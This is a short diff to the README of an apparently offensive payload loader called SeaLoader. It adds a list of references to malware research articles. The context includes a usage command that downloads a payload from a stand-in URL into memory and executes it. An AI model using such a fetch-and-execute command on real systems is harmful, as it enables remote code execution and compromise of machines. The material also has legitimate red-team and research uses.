@@ -76,4 +76,10 @@ Host the file on a web server and use the loader to download into memory and exe
 .\SeaLoader.exe /p:http://example.com/payload.bin /x:HelloWorld
 ```
 
+## References/Inspiration
+* https://www.zscaler.com/blogs/security-research/coffeeloader-brew-stealthy-techniques
+* https://eversinc33.com/posts/gpu-malware.html
+* https://www.4hou.com/posts/xyE9
+* https://www.antiy.net/Download/comprehensive-analysis-of-armouryloader-series-analysis-of-typical-loader-families-five.pdf
+* https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/
 
